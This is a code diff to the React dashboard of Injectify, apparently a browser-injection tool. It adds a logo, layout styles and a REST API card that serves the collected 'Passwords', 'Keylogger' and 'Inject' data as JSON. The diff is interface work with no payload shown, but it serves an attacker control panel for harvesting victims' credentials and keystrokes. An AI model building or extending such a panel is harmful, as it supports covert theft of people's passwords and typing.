@@ -42,6 +42,7 @@ import ComputerIcon from 'material-ui-icons/Computer';
 import DeleteIcon from 'material-ui-icons/Delete';
 import DeleteSweep from 'material-ui-icons/DeleteSweep';
 import LockIcon from 'material-ui-icons/Lock';
+import TimelineIcon from 'material-ui-icons/Timeline';
 import CloseIcon from 'material-ui-icons/Close';
 import { CircularProgress } from 'material-ui/Progress';
 import Slide from 'material-ui/transitions/Slide';
@@ -159,6 +160,12 @@ const styles = theme => ({
     flex: '1',
     cursor: 'pointer',
     userSelect: 'none',
+    paddingLeft: 35,
+  },
+  appBarLogo: {
+    position: 'fixed',
+    marginLeft: -35,
+    height: 24,
   },
   avatar: {
     width: 35,
@@ -242,6 +249,7 @@ const styles = theme => ({
   },
   contentCard: {
     marginBottom: 30,
+    width: '100%'
   },
   tableCell: {
     padding: '4px 25px',
@@ -249,12 +257,30 @@ const styles = theme => ({
   center: {
     textAlign: 'center',
   },
+  '@media (min-width: 1100px)': {
+    restAPI: {
+      maxWidth: 350
+    },
+    contentCard: {
+      marginLeft: 5,
+      marginRight: 5,
+    },
+    dualCard: {
+      display: 'flex'
+    },
+  },
   '@media (max-width: 500px)': {
     content: {
       padding: theme.spacing.unit * 3 + "px " + theme.spacing.unit + "px",
     },
     tableCell: {
       padding: '4px 15px',
+    },
+    tabsLoading: {
+      top: 112
+    },
+    tabsContent: {
+      marginTop: 112
     }
   },
   '@media (max-width: 400px)': {
@@ -290,7 +316,7 @@ const styles = theme => ({
     height: 'calc(100% - 135px)',
   },
   loadingMain: {
-    opactity: '0.4'
+    opacity: '0.4'
   },
   injectContainer: {
     display: 'flex',
@@ -591,10 +617,6 @@ class PersistentDrawer extends Component {
     this.saveAccounts()
   }
 
-	viewJSON = type => {
-		window.open(`/api/${type}/` + encodeURIComponent(this.state.currentProject.name) + `?token=` + encodeURIComponent(this.props.token) /*+ "&download=true"*/)
-  }
-
   spoofOpen = () => {
     this.setState({
       spoof: {
@@ -643,6 +665,16 @@ class PersistentDrawer extends Component {
     window.history.pushState('', 'Configuration - Injectify', '/config')
   }
 
+  tab = (label, icon) => {
+    return (
+      window.innerWidth > 500 ? (
+        <Tab label={label} icon={icon} />
+      ) : (
+        <Tab icon={icon} />
+      )
+    )
+  }
+
   render() {
     const { classes, theme, signIn, parentState, loading, darkMode } = this.props
     const { open } = this.state
@@ -666,7 +698,7 @@ class PersistentDrawer extends Component {
                 <MenuIcon />
               </IconButton>
               <Typography type="title" color="inherit" noWrap className={classes.appBarHeader} onClick={this.returnHome.bind(this)}>
-                  Injectify [BETA]
+                  <img src="/assets/logo/injectify.svg" className={classes.appBarLogo} /> Injectify
               </Typography>
               {parentState.user.login ? (
                   <Button color="contrast" onClick={this.switchUser} className="signed-in">
@@ -688,11 +720,11 @@ class PersistentDrawer extends Component {
                 fullWidth
                 className={classes.tabs}
               >
-                <Tab label="Overview" icon={<LockIcon />} disabled={loading} />
-                <Tab label="Passwords" icon={<LockIcon />} disabled={loading} />
-                <Tab label="Keylogger" icon={<KeyboardIcon />} disabled={loading} />
-                <Tab label="Inject" icon={<CodeIcon />} disabled={loading} />
-                <Tab label="Project config" icon={<SettingsIcon />} disabled={loading} />
+                {this.tab('Overview', <TimelineIcon />)}
+                {this.tab('Passwords', <LockIcon />)}
+                {this.tab('Keylogger', <KeyboardIcon />)}
+                {this.tab('Inject', <CodeIcon />)}
+                {this.tab('Project config', <SettingsIcon />)}
               </Tabs>
             ) : null
           }
@@ -802,11 +834,6 @@ class PersistentDrawer extends Component {
                   </Paper>
                   <br />
                   <Javascript parentState={this.state} notify={this.props.notify} classes={classes} />
-                  <Tooltip title="Show the raw JSON database entries" placement="bottom">
-                    <Button onClick={() => this.viewJSON('passwords')} color="primary">
-                      View JSON
-                    </Button>
-                  </Tooltip>
                   {this.state.recordOpen ? (
                     <span>
                       <Dialog
@@ -1017,11 +1044,6 @@ class PersistentDrawer extends Component {
                       }
                     </Table>
                   </Paper>
-                  <Tooltip title="Show the raw JSON database entries" placement="bottom">
-                    <Button onClick={() => this.viewJSON('keylogger')} color="primary">
-                      View JSON
-                    </Button>
-                  </Tooltip>
                   {this.state.recordOpen ? (
                     <Dialog
                       fullScreen
@@ -1162,6 +1184,12 @@ class ProjectList extends Component {
 			return (
         <div>
           <List>
+            <ListItem button onClick={() => window.open('https://github.com/samdenty99/injectify')}>
+              <ListItemIcon>
+                <SettingsIcon />
+              </ListItemIcon>
+              <ListItemText primary="GitHub" />
+            </ListItem>
             <ListItem button onClick={configPage.bind(this)}>
               <ListItemIcon>
                 <SettingsIcon />
@@ -1822,7 +1850,6 @@ class ProjectConfig extends Component {
             </div>
 
             <Divider light className={classes.permissionDivider} />
-
             <Typography type="subheading" gutterBottom className={classes.permissionGroup}>
               <span className={classes.permissionsHeader}>
                 Owners:
@@ -1909,7 +1936,10 @@ class ProjectConfig extends Component {
             )}
           </CardContent>
         </Card>
-        <DomainFiltering classes={classes} filter={project.config.filter} write={!project.permissions.readonly.includes(loggedInUser.id)} emit={this.props.emit} projectName={project.name} />
+        <div className={classes.dualCard}>
+          <RestAPI classes={classes} project={project.name} token={token} />
+          <DomainFiltering classes={classes} filter={project.config.filter} write={!project.permissions.readonly.includes(loggedInUser.id)} emit={this.props.emit} projectName={project.name} />
+        </div>
         <Dialog open={this.state.open} onClose={this.handleRequestClose}>
           {this.state.dialog == "remove" ? (
             <div>
@@ -2049,6 +2079,52 @@ class UserChip extends Component {
           }
         }
       </Request>
+    )
+  }
+}
+
+class RestAPI extends Component {
+  open = endpoint => {
+    const { project, token } = this.props
+    window.open(`/api/${endpoint.toLowerCase()}/${encodeURIComponent(project)}?token=${encodeURIComponent(token)}`)
+  }
+
+  endpoint = endpoint => {
+    return (
+      <TableRow>
+        <TableCell>{endpoint}</TableCell>
+        <TableCell numeric>
+          <Button raised color="primary" onClick={() => this.open(endpoint)}>
+            JSON
+          </Button>
+        </TableCell>
+      </TableRow>
+    )
+  }
+
+  render() {
+    const { classes } = this.props
+    return (
+      <Card className={`${classes.contentCard} ${classes.restAPI}`}>
+        <CardContent>
+          <Typography type="headline" className={classes.title}>
+            REST API
+          </Typography>
+          <Table>
+            <TableHead>
+              <TableRow>
+                <TableCell>Endpoint</TableCell>
+                <TableCell></TableCell>
+              </TableRow>
+            </TableHead>
+            <TableBody>
+              {this.endpoint('Passwords')}
+              {this.endpoint('Keylogger')}
+              {this.endpoint('Inject')}
+            </TableBody>
+          </Table>
+        </CardContent>
+      </Card>
     )
   }
 }
